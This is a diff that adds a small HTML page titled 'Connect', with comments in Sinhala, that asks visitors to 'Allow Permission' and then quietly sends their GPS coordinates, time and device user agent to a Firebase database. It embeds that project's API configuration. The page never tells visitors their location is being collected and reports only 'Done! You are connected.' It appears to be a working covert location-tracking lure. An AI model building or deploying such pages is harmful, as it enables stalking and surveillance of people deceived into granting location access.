@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="text-align:center; padding:50px; font-family:sans-serif;">
+    <h3>Please Allow Permissions to Continue</h3>
+    <button id="btn" style="padding:15px; background:blue; color:white; border:none; border-radius:10px; font-size:18px;">Allow Permission</button>
+    <p id="msg"></p>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+        // ඔබේ පින්තූරයේ තිබුණු දත්ත ඇතුළත් කර ඇත
+        const firebaseConfig = {
+            apiKey: "AIzaSyCSrL5IZHh5Zy4cFITVF9wxdiaeiynyOrM",
+            authDomain: "myself-4706c.firebaseapp.com",
+            projectId: "myself-4706c",
+            storageBucket: "myself-4706c.firebasestorage.app",
+            messagingSenderId: "638432919752",
+            appId: "1:638432919752:web:0de83de77e3b9e3a97a5fd"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        document.getElementById('btn').onclick = async () => {
+            document.getElementById('msg').innerText = "Processing...";
+            
+            // Location සහ අනෙකුත් දත්ත Database එකට යැවීම
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await addDoc(collection(db, "contacts_list"), {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        time: new Date().toLocaleString(),
+                        device: navigator.userAgent
+                    });
+                    document.getElementById('msg').innerText = "Done! You are connected.";
+                    document.getElementById('msg').style.color = "green";
+                });
+            }
+        };
+    </script>
+</body>
+</html>
